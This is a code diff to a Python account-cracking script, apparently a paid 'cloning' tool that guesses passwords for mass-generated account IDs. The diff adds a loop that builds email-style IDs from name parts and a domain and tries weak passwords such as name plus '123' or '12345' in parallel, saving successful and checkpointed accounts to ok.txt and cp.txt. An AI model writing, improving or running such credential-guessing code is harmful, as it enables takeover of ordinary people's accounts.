@@ -179,7 +179,7 @@ __   __  __   __  _______  _______  __   __  __   __  ___   ___
 \033[1;93m--------------------------------------------------
 \033[1;37m[-] OWNER     :\033[1;32m MUZZI TRICKER
 \033[1;37m[-] FACEBOOK    :\033[1;32m MUZAMMIL HUSSAIN
-\033[1;37m[-] VERSION   :\033[1;32m 1.0
+\033[1;37m[-] VERSION   :\033[1;32m 1.9
 \033[1;37m[-] STATUS    :\033[1;32m Paid
 --------------------------------------------------""")
 def linex():
@@ -196,7 +196,7 @@ def fia():
 			print(logo)
 			print('\033[1;32m>>> Legend :\x1b[1;97m  ')
 			linex()
-			print('[1] File Clone\n[2] Pakistan Random Cloning\n[3] Bangladesh Cloning\n[4] Gmail Cloning\n[0] Exit')
+			print('[1] File Clone\n[2] Pakistan Random Cloning\n[3] Bangladesh Cloning\n[4] Email Cloning\n[0] Exit')
 			linex()
 			xd=input('[*] Choose an option: ')
 			if xd in ['1','01']:
@@ -535,6 +535,12 @@ def gml():
         print(' \033[1;91m[!] Wait for ids ')
         print(' \033[1;95m[!] Use flight mode for speed up ')
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+guru+doamin
+            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
 #_____
 def fcrack(uid,pwx,tl):
 	#print(user)
